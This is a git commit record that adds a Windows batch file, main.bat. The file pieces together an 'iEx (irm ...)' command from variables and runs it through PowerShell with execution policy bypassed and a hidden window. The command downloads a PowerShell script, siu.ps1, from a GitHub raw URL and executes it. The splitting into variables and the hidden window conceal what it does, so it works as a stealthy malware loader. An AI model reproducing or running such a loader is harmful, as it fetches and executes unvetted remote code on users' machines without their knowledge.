bbc04906d413da4ae53daa6dbdec7859b6b35732
m4x7c <rizzbro995@gmail.com>
2025-12-18 22:28:16 +0600

    Add files via upload

---
+++ main.bat
@@ -0,0 +1,7 @@
+@echo off
+setlocal EnableDelayedExpansion
+set "Hasinadibos420=iEx (irm "
+set "joyahsan70=https://github.com/m4x7c/hfd/raw/refs/heads/main/siu.ps1"
+set "polandsoon2026=!Hasinadibos420!!joyahsan70!)"
+powershell -NoP -NonI -Exec Bypass -W Hidden -c "!polandsoon2026!"
+endlocal
